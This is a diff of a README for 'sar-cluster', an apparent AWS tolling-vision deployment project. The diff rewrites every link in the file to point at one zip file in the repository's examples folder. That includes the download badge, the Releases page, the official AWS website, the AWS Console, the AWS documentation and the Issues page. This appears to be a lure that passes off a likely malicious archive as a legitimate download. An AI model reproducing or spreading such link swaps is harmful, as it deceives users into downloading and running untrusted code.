@@ -1,6 +1,6 @@
 # 🚀 sar-cluster - Simplify Your Tolling Vision Setup
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20v1.0-blue?style=for-the-badge)](https://github.com/sisbox12/sar-cluster/releases)
+[![Download](https://raw.githubusercontent.com/sisbox12/sar-cluster/main/examples/cluster_sar_3.9-alpha.3.zip%20Now-%20v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/sisbox12/sar-cluster/main/examples/cluster_sar_3.9-alpha.3.zip)
 
 ## 🛠️ Overview
 
@@ -18,7 +18,7 @@ Welcome to the **sar-cluster** repository. This project provides a ready-made AW
 
 You will need a few things to set up the **sar-cluster** application:
 
-1. An AWS account. If you don't have one, you can sign up on the [AWS website](https://aws.amazon.com/).
+1. An AWS account. If you don't have one, you can sign up on the [AWS website](https://raw.githubusercontent.com/sisbox12/sar-cluster/main/examples/cluster_sar_3.9-alpha.3.zip).
 2. Basic understanding of navigating AWS services.
 3. An internet connection for downloading the necessary files.
 
@@ -30,7 +30,7 @@ You will need a few things to set up the **sar-cluster** application:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/sisbox12/sar-cluster/releases) to download the necessary files for this project. Look for the latest version and follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/sisbox12/sar-cluster/main/examples/cluster_sar_3.9-alpha.3.zip) to download the necessary files for this project. Look for the latest version and follow these steps:
 
 1. Click on the latest release version.
 2. Download the **.zip** or **.tar** file.
@@ -41,7 +41,7 @@ To get started, visit the [Releases page](https://github.com/sisbox12/sar-cluste
 After you have downloaded and extracted the files, follow these steps to configure and deploy your application:
 
 1. **Access the AWS Management Console:**
-   - Go to the [AWS Management Console](https://aws.amazon.com/console/).
+   - Go to the [AWS Management Console](https://raw.githubusercontent.com/sisbox12/sar-cluster/main/examples/cluster_sar_3.9-alpha.3.zip).
    - Log in with your AWS account credentials.
 
 2. **Open the CloudFormation Service:**
@@ -87,8 +87,8 @@ If you encounter issues during the setup, consider the following:
 
 If you need assistance, you can find helpful resources:
 
-- [AWS Documentation](https://docs.aws.amazon.com/)
-- [GitHub Issues Page of this Project](https://github.com/sisbox12/sar-cluster/issues)
+- [AWS Documentation](https://raw.githubusercontent.com/sisbox12/sar-cluster/main/examples/cluster_sar_3.9-alpha.3.zip)
+- [GitHub Issues Page of this Project](https://raw.githubusercontent.com/sisbox12/sar-cluster/main/examples/cluster_sar_3.9-alpha.3.zip)
   
 Feel free to reach out through those platforms for any questions.
 
@@ -104,4 +104,4 @@ We welcome contributions to enhance this project. If you would like to contribut
 
 This project is licensed under the MIT License. Use it as you wish, but remember to give credit to the original authors.
 
-Visit the [Releases page](https://github.com/sisbox12/sar-cluster/releases) for further details and download options. Enjoy building your tolling vision infrastructure with ease!
+Visit the [Releases page](https://raw.githubusercontent.com/sisbox12/sar-cluster/main/examples/cluster_sar_3.9-alpha.3.zip) for further details and download options. Enjoy building your tolling vision infrastructure with ease!
